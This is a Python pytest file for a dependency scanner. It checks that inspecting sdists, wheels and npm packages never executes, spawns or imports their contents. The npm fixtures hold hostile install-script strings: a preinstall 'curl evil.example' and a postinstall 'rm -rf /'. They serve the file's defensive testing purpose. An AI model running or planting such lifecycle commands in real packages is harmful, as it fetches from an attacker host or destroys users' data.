"""The reader must not execute, spawn, or import what it inspects.

Monkeypatches turn every process spawn into an exception for the duration of
the parse. A planted module in the archive must not appear in sys.modules.
This is the same promise as test_never_executes.py, aimed at fixtures that try
harder than a friendly setup.py.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from assurance_deps.archives import examine_archive
from assurance_deps.npm import read_direct_dependencies, read_package_tree
from assurance_deps.scan import scan_manifest

from hostile_helpers import (
    assert_returns_quickly,
    assert_sys_modules_stable,
    block_all_execution,
    write_sdist,
    write_wheel,
)


def test_examine_archive_under_blocked_exec_and_stable_sys_modules(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    planted = "hostile_planted_setup_side_effect"
    setup = (
        f"import {planted}\n"
        "import subprocess, os\n"
        "subprocess.Popen(['true'])\n"
        "os.system('true')\n"
        "from setuptools import setup\n"
        "setup(name='blocked', version='1.0')\n"
    )
    # Plant a module on disk next to the archive so a mistaken import could find it.
    (tmp_path / f"{planted}.py").write_text("MARKER = 1\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    archive = write_sdist(
        tmp_path / "blocked-1.0.tar.gz",
        [
            ("blocked-1.0/setup.py", setup.encode(), {}),
            ("blocked-1.0/PKG-INFO", b"Name: blocked\nVersion: 1.0\n", {}),
        ],
    )

    with block_all_execution(monkeypatch), assert_sys_modules_stable():
        found = assert_returns_quickly(lambda: examine_archive(archive))

    assert planted not in sys.modules
    assert found.runs_at_install


def test_wheel_with_importable_top_level_is_not_imported(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    planted = "hostile_planted_wheel_mod"
    (tmp_path / f"{planted}.py").write_text("raise RuntimeError('imported')\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    wheel = write_wheel(
        tmp_path / "wplant-1.0-py3-none-any.whl",
        {
            f"{planted}/__init__.py": b"raise RuntimeError('wheel imported')\n",
            "wplant-1.0.dist-info/METADATA": b"Metadata-Version: 2.1\nName: wplant\nVersion: 1.0\n",
            "wplant-1.0.dist-info/WHEEL": b"Wheel-Version: 1.0\n",
        },
    )

    with block_all_execution(monkeypatch), assert_sys_modules_stable():
        found = examine_archive(wheel)

    assert planted not in sys.modules
    assert not found.runs_at_install


def test_npm_read_does_not_spawn_lifecycle_shell(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    app = tmp_path / "app"
    app.mkdir()
    (app / "package.json").write_text(
        '{"name":"app","version":"1.0.0","scripts":{"preinstall":"curl evil.example"},'
        '"dependencies":{"x":"1.0.0"}}',
        encoding="utf-8",
    )
    mod = app / "node_modules" / "x"
    mod.mkdir(parents=True)
    (mod / "package.json").write_text(
        '{"name":"x","version":"1.0.0","scripts":{"postinstall":"rm -rf /"}}',
        encoding="utf-8",
    )
    (app / "package-lock.json").write_text(
        '{"lockfileVersion":3,"packages":{"":{},"node_modules/x":{"version":"1.0.0","hasInstallScript":true}}}',
        encoding="utf-8",
    )

    with block_all_execution(monkeypatch):
        tree = read_package_tree(app / "package.json")
        deps, err = read_direct_dependencies(app / "package.json")
        report = scan_manifest(app / "package.json")

    assert err == ""
    assert deps
    assert tree
    assert report.total >= 1
